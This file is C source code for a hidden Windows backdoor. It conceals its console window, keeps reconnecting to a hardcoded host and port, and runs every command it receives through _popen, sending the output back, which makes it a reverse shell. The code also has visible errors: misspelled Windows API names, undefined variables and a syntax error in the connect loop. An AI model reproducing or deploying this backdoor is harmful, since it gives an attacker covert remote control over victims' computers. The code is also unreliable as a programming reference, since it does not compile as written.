#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <winsock2.h> // socket programming
#include <windows.h> // windows library
#include <winuser.h> // windows users
#include <wininet.h> // network library
#include <windowsx.h>
#include <string.h> // string manipulation
#include <sys/stat.h>
#include <sys/types.h>

// memset equivalent for linux bzero
#define bzero(p, size) (void) memset((p), 0, (size))

// global socket
int sock;

// shell
void shell() {
  char buffer[1024]; // commands received
  char container[1024];
  char response[18384];
  // infinite loop
  while(1) {
    jump:
    // allocating zeros
    bzero(buffer, 1024);
    bzero(container, sizeof(container));
    bzero(response, sizeof(response));
    // receiving functions - storing in buffer
    recv(sock, buffer, sizeof(response), 0);

    // commands comparison
    if(strncmp("q", buffer, 1) == 0) {
      // closing socket and program
      closeSocket(sock);
      WSACleanup();
      exit(0);
    } else {
      // file descriptors
      FILE * fp;
      // run as process - run buffer
      fp = _popen(buffer, "r");
      // response can fit into 1024 bytes - place in container
      while(fgets(container, 1024, ftp) != NULL) {
        strcat(total, container); // adding the container content into total
      }
      // send total to the server
      send(sock, total, sizeof(total), 0);
      fclose();
    }

  }
}

// windows entrypoint
int APIENTRY main(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow) {
  HWND stealth; // make it invisible
  AllocConsole(); // new console
  stealth = findWindowA("ConsoleWindowClass", NULL); // handle to the top level Window
  ShowWindow(stealth, 0); // 0 is the nCmdShow

  struct sockaddr_in address; // Server Address
  unsigned short port; // port
  char *ip; // pointer to the server IP
  WSADATA wsaData; // windows socket object

  // IP for backdoor
  ip = "192.168.1.111";
  port = 6969;

  // check for sock initialization
  if(WSAStartup(MAKEWORD(2,0), &wsaData) != 0) {
    exit(1);
  }

  // defining socket object TCP
  sock = socket(AF_INET, SOCK_STREAM, 0);
  // defining sock params
  memset(&address, 0, sizeof(address)); // filling with zeros (memory, params and length)
  address.sin_family = AF_NET; // ipv4
  address.sin_addr.s_addr = inet_addr(ip); // IP address
  address.sin_port = htons(port); // port

  start:
  // perform the socket connection until the client is connected
  while connect(sock, (struct sockaddr *), &address, sizeof(address)) != 0) {
    Sleep(10);
    goto start; // goto - start function
  }

  shell(); // receive commands from the server , execute it and send the result
}
